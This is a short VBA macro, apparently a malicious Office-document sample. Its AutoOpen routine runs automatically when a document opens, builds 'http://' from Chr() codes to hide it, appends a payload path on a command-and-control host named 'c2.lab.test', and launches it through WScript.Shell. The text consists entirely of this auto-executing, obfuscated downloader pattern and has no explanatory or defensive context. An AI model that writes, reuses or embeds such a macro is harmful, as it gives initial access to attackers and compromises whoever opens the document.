Sub AutoOpen()
    Dim s As String
    s = Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(58) & Chr(47) & Chr(47)
    s = s & "c2.lab.test/payload"
    CreateObject("WScript.Shell").Run s
End Sub
